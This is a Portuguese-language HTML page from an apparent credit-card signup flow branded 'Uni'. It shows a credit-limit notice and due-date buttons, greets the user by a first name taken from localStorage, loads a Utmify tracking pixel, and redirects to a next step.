<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uni - Faça seu Cartão</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="assets/style.css">
    
<script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  async
  defer
></script>

<script>
  window.pixelId = "66bb763debbcebab27d68442";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
</script>
    
</head><body>
    <link rel="stylesheet" href="../../assets/style.css">

<div style="
  display: grid;
  grid-template-areas:
    'top-bar'
    'content'
    'footer';
  grid-template-rows: auto 1fr auto;
  min-height: 100vh;
">   
    <div class="header">
        <img style="width: 120px;" src="https://i.imgur.com/Q0PyyEg.png" alt="Imagem Centralizada">
    </div>

    <div style="grid-area: content; padding: 0 1rem;">
        <div style="margin-top: 18px; padding: 2rem 1.5rem 1rem 1.5rem;" class="main-content">
            <div id="analise-secao" class="mb-3 ">
                <p class="text-start">Caso você realize o pagamento das faturas em dia, seu limite será aumentado constantemente. </p>
                <p class="text-start">No entanto, se houver atraso no pagamento das faturas, o limite poderá ser reduzido. </p>
                <button class="btn btn-custom rounded-pill" onclick="mostrarPagina('vencimento-secao')">Concordo</button>
            </div>
    
            <!-- Seção da escolha do vencimento da fatura -->
            <div id="vencimento-secao" class="mb-3">
                <p style="font-size: 18px;">Ótimo <strong id="nomeCliente"></strong>! Agora escolha o vencimento da sua fatura!</p>
                <button class="btn btn-custom w-100">05</button>
                <button class="btn btn-custom w-100">10</button>
                <button class="btn btn-custom w-100">15</button>
                <button class="btn btn-custom w-100">25</button>
                <button class="btn btn-custom w-100">30</button>
            </div>
        </div>
    </div>

    <script>
    document.addEventListener("DOMContentLoaded", function() {
        // Verifica se 'dadosUsuarioUni' existe no localStorage e tenta analisá-lo como JSON
        const dadosUsuarioString = localStorage.getItem('dadosUsuarioUni');
        let dadosUsuario = null;

        try {
            dadosUsuario = JSON.parse(dadosUsuarioString);
        } catch (error) {
            console.error('Erro ao analisar os dados do usuário:', error);
        }

        // Verifica se os dados existem e se estão em uma das estruturas esperadas
        if (dadosUsuario && (dadosUsuario.nome || (dadosUsuario.data && dadosUsuario.data.nome))) {
            // Verifica se o nome está diretamente em 'dadosUsuario' ou em 'dadosUsuario.data'
            const nomeCompleto = dadosUsuario.nome ? dadosUsuario.nome.split(' ') : dadosUsuario.data.nome.split(' ');
            const primeiroNome = nomeCompleto[0];
            const nomeParaMostrar = `${primeiroNome}`;
            document.getElementById('nomeCliente').textContent = nomeParaMostrar;
        } else {
            console.error('Nome do usuário não encontrado no localStorage.');
        }
    });

    function mostrarPagina(paginaId) {
        // Esconde todas as seções
        document.getElementById('analise-secao').style.display = 'none';
        document.getElementById('vencimento-secao').style.display = 'none';

        // Mostra a seção desejada
        document.getElementById(paginaId).style.display = 'block';
    }
    
    // Mostra a seção de escolha do vencimento inicialmente
    mostrarPagina('analise-secao');

    // Event listener para capturar a escolha e mostrar a próxima seção
    document.querySelectorAll('#vencimento-secao .btn').forEach(button => {
        button.addEventListener('click', function() {
            window.location.href = '../recebimento/index.php';
        });
    });
</script>

    <div class="footer py-4" id="footerChg">
        © 2024 Uni S/A. CNPJ 68.842.676/0001-66. <br>
         Av. paulista 1320, São Paulo/SP - CEP 01310-930
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

</body>
</html>

</div>